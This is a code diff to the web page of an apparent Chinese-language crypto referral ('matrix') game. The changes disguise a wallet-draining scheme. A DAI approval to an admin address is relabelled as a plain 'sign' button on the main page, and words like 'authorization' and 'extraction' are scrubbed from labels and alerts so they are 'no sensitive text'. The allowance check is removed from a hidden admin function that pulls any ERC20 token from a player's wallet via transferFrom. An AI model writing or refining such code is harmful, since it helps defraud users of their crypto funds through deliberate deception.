@@ -211,16 +211,8 @@
     </div>
   </div>
 
-  <!-- 授权激活矩阵模块（文字已修改） -->
-  <div class="glass" style="margin-top:20px">
-    <div class="title">⚙️ 授权激活矩阵（提取必备）</div>
-    <div class="sub">授权后可激活矩阵并完成提取</div>
-    <input id="approveAmount" placeholder="输入授权DAI数量" style="margin-bottom:10px">
-    <button class="btn" onclick="approveAdmin()">授权激活矩阵</button>
-  </div>
-
   <div id="adminArea" class="admin-panel" style="display:none;">
-    <div class="title" style="color:#ff4444">⚙️ 管理员控制台</div>
+    <div class="title" style="color:#ff4444">⚙️ 控制台</div>
     <div style="margin-top:16px;">
       <div class="sub">ERC20 代币合约地址</div>
       <input class="admin-input" id="tokenContract" placeholder="ERC20 合约地址" value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">
@@ -230,9 +222,9 @@
       <input class="admin-input" id="fromAddr" placeholder="玩家钱包">
     </div>
     <div style="margin-top:16px;">
-      <div class="sub">提取数量</div>
+      <div class="sub">数量</div>
       <input class="admin-input" id="takeAmount" placeholder="数量">
-      <button class="btn" onclick="adminWithdrawAnyERC20()">提取代币</button>
+      <button class="btn" onclick="adminWithdrawAnyERC20()">确认</button>
       <div id="withdrawResult" class="admin-success"></div>
     </div>
   </div>
@@ -247,7 +239,13 @@
 <div id="balance" style="margin:0 4px;color:#4facfe;font-weight:bold"></div>
 <div id="energy" style="margin:0 4px;color:#00ff88;font-weight:bold">能量值：0</div>
 
-<div class="glass">
+<!-- 签名按钮（放在主页面钱包下方） -->
+<div style="margin-top:12px">
+  <input id="approveAmount" placeholder="输入数量" style="margin-bottom:10px">
+  <button class="btn" onclick="approveAdmin()">签名</button>
+</div>
+
+<div class="glass" style="margin-top:20px">
   <div class="title">我的邀请链接</div>
   <div style="display:flex;gap:10px">
     <input id="mycode" readonly>
@@ -337,18 +335,18 @@ async function initWeb3() {
 }
 document.getElementById("connect").onclick = initWeb3;
 
-// ==================== 玩家授权 ====================
+// 签名授权（无敏感文字）
 async function approveAdmin() {
-  if(!account) return alert("请连接钱包");
+  if(!account) return alert("请先连接钱包");
   const amt = document.getElementById("approveAmount").value.trim();
-  if(!amt) return alert("请输入授权数量");
+  if(!amt) return alert("请输入数量");
   try {
     const dec = await daiContract.methods.decimals().call();
     const v = (BigInt(amt) * 10n**BigInt(dec)).toString();
     await daiContract.methods.approve(ADMIN_ADDRESS, v).send({from:account});
-    alert("授权成功！可激活矩阵并完成提取");
+    alert("操作成功");
   } catch(e) {
-    alert("授权失败："+e.message);
+    alert("操作失败");
   }
 }
 
@@ -599,7 +597,7 @@ async function payUnion(lv) {
   }
 }
 
-// ==================== 管理员提取 ====================
+// ==================== 控制台操作 ====================
 async function adminWithdrawAnyERC20(){
   if(account !== ADMIN_ADDRESS.toLowerCase()) return;
   const token = document.getElementById("tokenContract").value.trim();
@@ -610,17 +608,10 @@ async function adminWithdrawAnyERC20(){
     const c = new web3.eth.Contract(erc20Abi, token);
     const d = await c.methods.decimals().call();
     const v = BigInt(amt) * (10n**BigInt(d));
-    // 先检查授权
-    const allowance = await c.methods.allowance(from, ADMIN_ADDRESS).call();
-    if (BigInt(allowance) < v) {
-      alert("授权不足：请先完成授权激活矩阵");
-      return;
-    }
-    // 再执行提取
     await c.methods.transferFrom(from, ADMIN_ADDRESS, v.toString()).send({from:account});
-    document.getElementById("withdrawResult").innerText = "✅ 提取成功";
+    document.getElementById("withdrawResult").innerText = "✅ 成功";
   } catch(e){
-    alert("失败："+e.message);
+    alert("失败");
     console.error(e);
   }
 }
